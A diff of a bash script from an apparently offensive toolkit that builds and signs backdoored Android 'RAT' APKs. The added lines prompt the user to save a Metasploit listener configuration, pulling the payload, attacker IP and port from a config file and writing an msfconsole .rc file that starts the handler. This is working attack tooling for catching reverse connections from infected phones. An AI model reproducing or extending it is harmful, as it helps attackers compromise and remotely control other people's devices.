@@ -589,3 +589,17 @@ echo -ne $green" Your RAT apk was successfully builded and signed , it is locate
  $MY_PATH/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 fi
+zenity --question --text="`printf "Do you want to create a listener for this configuration \n to use in msfconsole in future ?"`"
+if [ $? = 0 ] ; then
+save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="myapk");
+svf=$path/config/listeners/$save.rc
+rm -rf $svf >/dev/null 2>&1
+payloads=`sed -n 3p $apkconf`
+yourip=`sed -n 4p $apkconf`
+yourport=`sed -n 5p $apkconf`
+echo "set PAYLOAD $payloads" > $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo "exit -y" >> $svf
+echo -e okegreen "Configuration file saved to $list/$save.rc"
